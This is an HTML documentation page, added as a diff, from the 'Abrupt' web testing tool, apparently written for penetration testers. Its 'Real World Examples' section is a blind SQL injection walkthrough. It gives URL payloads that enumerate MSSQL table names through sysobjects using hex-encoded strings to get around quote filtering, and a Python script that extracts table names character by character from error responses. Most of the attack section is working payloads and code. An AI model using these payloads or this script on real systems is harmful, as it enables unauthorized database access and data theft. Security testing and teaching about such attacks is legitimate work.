@@ -1,0 +1,154 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    
+    <title>Real World Examples &mdash; Abrupt v0.1 documentation</title>
+    <link rel="stylesheet" href="_static/abrupt.css" type="text/css" />
+    <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
+    <script type="text/javascript">
+      var DOCUMENTATION_OPTIONS = {
+        URL_ROOT:    '',
+        VERSION:     '0.1',
+        COLLAPSE_INDEX: false,
+        FILE_SUFFIX: '.html',
+        HAS_SOURCE:  true
+      };
+    </script>
+    <script type="text/javascript" src="_static/jquery.js"></script>
+    <script type="text/javascript" src="_static/underscore.js"></script>
+    <script type="text/javascript" src="_static/doctools.js"></script>
+    <link rel="top" title="Abrupt v0.1 documentation" href="index.html" />
+    <link rel="next" title="CheatSheet" href="cheatsheet.html" />
+    <link rel="prev" title="abrupt.injection - Request generator" href="injection.html" /> 
+  </head>
+  <body>
+    <div class="related">
+      <h3>Navigation</h3>
+      <ul>
+        <li class="right" style="margin-right: 10px">
+          <a href="genindex.html" title="General Index"
+             accesskey="I">index</a></li>
+        <li class="right" >
+          <a href="cheatsheet.html" title="CheatSheet"
+             accesskey="N">next</a> |</li>
+        <li class="right" >
+          <a href="injection.html" title="abrupt.injection - Request generator"
+             accesskey="P">previous</a> |</li>
+        <li><a href="index.html">Abrupt v0.1 documentation</a> &raquo;</li> 
+      </ul>
+    </div>  
+
+    <div class="document">
+      <div class="documentwrapper">
+          <div class="body">
+            
+  <div class="section" id="real-world-examples">
+<h1>Real World Examples<a class="headerlink" href="#real-world-examples" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="blind-sql-injection">
+<h2>Blind SQL Injection<a class="headerlink" href="#blind-sql-injection" title="Permalink to this headline">¶</a></h2>
+<p>After couple hours spend on a web application testing, you finally find a SQLi
+in on of the URL parameters. Some filtering are made and the only response you get
+is a generic error. You&#8217;ve tried to set up sqlmap but it just can&#8217;t recognise your
+blind injection. Time to go home? Nop, time to start Abrupt!</p>
+<p>Here is an example of the injection:</p>
+<div class="highlight-python"><pre>/index.jsp?ordering=1,(SELECT+CASE+WHEN+(boolean_expression)+
+           THEN+1+ELSE+(SELECT+1+WHERE+1%3dCHAR(00))+END)--</pre>
+</div>
+<p>After some tests, you find out that the quotes are filtered. We are going to
+find out the tables names and columns of this database using hexadecimal encoded
+string.</p>
+<p>Here is the request to test if there exists some table starting with &#8216;A&#8217;:</p>
+<div class="highlight-python"><pre>/index.jsp?ordering=1,(SELECT+CASE+WHEN+(
+      SELECT+count(name)+from+sysobjects+
+             where+xtype%3d0x55+
+             and+name+like+cast(0x4125+as+varchar(64))
+      )+BETWEEN+1+AND+100
+      +THEN+1+ELSE+(SELECT+1+WHERE+1%3dCHAR(00))+END)--</pre>
+</div>
+<p>From now, we should test each characters. For each character, if an error is
+returned, we will then try this character with one other append and so on.
+With this approach, we don&#8217;t have an exponential number of case to test.</p>
+<p>Here an example of code to get the table names:</p>
+<div class="highlight-python"><div class="highlight"><pre><span class="kn">from</span> <span class="nn">abrupt.all</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">load</span><span class="p">(</span><span class="s">&#39;r&#39;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">extract_correct_payload</span><span class="p">(</span><span class="n">rs</span><span class="p">):</span>
+  <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">  From a RequestSet, find the one considered as &quot;true&quot;</span>
+<span class="sd">  and returns all the corresponding payloads</span>
+<span class="sd">  &quot;&quot;&quot;</span>
+  <span class="n">correct_requests</span> <span class="o">=</span> <span class="n">rs</span><span class="o">.</span><span class="n">filter</span><span class="p">(</span><span class="n">response__status</span><span class="o">=</span><span class="s">&#39;500&#39;</span><span class="p">)</span>
+  <span class="n">hex_payloads</span> <span class="o">=</span> <span class="p">[</span> <span class="n">x</span><span class="p">[</span><span class="mi">7</span><span class="p">:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">correct_requests</span><span class="o">.</span><span class="n">extract</span><span class="p">(</span><span class="s">&quot;payload&quot;</span><span class="p">)]</span>
+  <span class="n">char_payloads</span> <span class="o">=</span> <span class="p">[</span><span class="s">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="s">&quot;0x&quot;</span><span class="o">+</span><span class="s">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">l</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]),</span><span class="mi">16</span><span class="p">))</span>
+                   <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">l</span><span class="p">),</span><span class="mi">2</span><span class="p">)])</span> <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">hex_payloads</span><span class="p">]</span>
+                   <span class="c"># Convert the payloads from hexadecimal to string</span>
+  <span class="k">return</span> <span class="n">char_payloads</span>
+
+<span class="k">def</span> <span class="nf">create_payloads</span><span class="p">(</span><span class="n">init_p</span><span class="p">):</span>
+  <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">  Generate the payloads. First convert to hex then derivate.</span>
+<span class="sd">  &quot;&quot;&quot;</span>
+  <span class="n">cur_hex_payloads</span> <span class="o">=</span> <span class="p">[</span><span class="s">&quot;0x&quot;</span> <span class="o">+</span> <span class="s">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">p</span><span class="p">])</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">init_p</span><span class="p">]</span>
+  <span class="n">new_hex_payloads</span> <span class="o">=</span> <span class="p">[</span> <span class="n">x</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">h</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span><span class="o">+</span><span class="s">&quot;25&quot;</span>
+                       <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">cur_hex_payloads</span> <span class="k">for</span> <span class="n">h</span> <span class="ow">in</span> <span class="n">payloads</span><span class="p">[</span><span class="s">&quot;printable&quot;</span><span class="p">]]</span>
+  <span class="k">return</span> <span class="n">new_hex_payloads</span>
+
+
+<span class="n">payloads</span><span class="p">[</span><span class="s">&quot;my&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="s">&quot;0x&quot;</span> <span class="o">+</span> <span class="s">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">p</span><span class="p">])</span><span class="o">+</span><span class="s">&quot;25&quot;</span>
+                   <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">payloads</span><span class="p">[</span><span class="s">&quot;printable&quot;</span><span class="p">]]</span>
+<span class="n">rss</span> <span class="o">=</span> <span class="n">i_at</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="n">payload</span><span class="o">=</span><span class="s">&quot;my&quot;</span><span class="p">)</span>
+<span class="n">rss</span><span class="p">()</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+  <span class="n">td</span> <span class="o">=</span> <span class="n">extract_correct_payload</span><span class="p">(</span><span class="n">rss</span><span class="p">)</span>
+  <span class="k">if</span> <span class="ow">not</span> <span class="n">td</span><span class="p">:</span>
+    <span class="k">break</span>
+  <span class="k">print</span> <span class="n">td</span>
+  <span class="n">payloads</span><span class="p">[</span><span class="s">&quot;my&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">create_payloads</span><span class="p">(</span><span class="n">td</span><span class="p">)</span>
+  <span class="n">rss</span> <span class="o">=</span> <span class="n">i_at</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="n">payload</span><span class="o">=</span><span class="s">&quot;my&quot;</span><span class="p">)</span>
+  <span class="n">rss</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>So, why Abrupt is really helpful for this kind of job:</p>
+<ul class="simple">
+<li>Restoring request: <tt class="docutils literal"><span class="pre">r</span> <span class="pre">=</span> <span class="pre">load('r')</span></tt></li>
+<li>Easy filtering on requests: <tt class="docutils literal"><span class="pre">rs.filter(response__status='200')</span></tt></li>
+<li>Quick extraction: <tt class="docutils literal"><span class="pre">correct_requests.extract(&quot;payload&quot;)</span></tt></li>
+<li>Generation of requests: <tt class="docutils literal"><span class="pre">rss</span> <span class="pre">=</span> <span class="pre">i_at(r,</span> <span class="pre">100,</span> <span class="pre">payload=&quot;my&quot;)</span></tt></li>
+</ul>
+<p>From there, any other exploitation could be based on that one (row enumeration).
+(Here, we don&#8217;t consider breaking out of the database).</p>
+</div>
+</div>
+
+
+          </div>
+      </div>
+      <div class="clearer"></div>
+    </div>
+    <div class="related">
+      <h3>Navigation</h3>
+      <ul>
+        <li class="right" style="margin-right: 10px">
+          <a href="genindex.html" title="General Index"
+             >index</a></li>
+        <li class="right" >
+          <a href="cheatsheet.html" title="CheatSheet"
+             >next</a> |</li>
+        <li class="right" >
+          <a href="injection.html" title="abrupt.injection - Request generator"
+             >previous</a> |</li>
+        <li><a href="index.html">Abrupt v0.1 documentation</a> &raquo;</li> 
+      </ul>
+    </div>
+    <div class="footer">
+        &copy; Copyright 2011, Securus Global.
+      Created using <a href="http://sphinx.pocoo.org/">Sphinx</a> 1.0.7.
+    </div>
+  </body>
+</html>
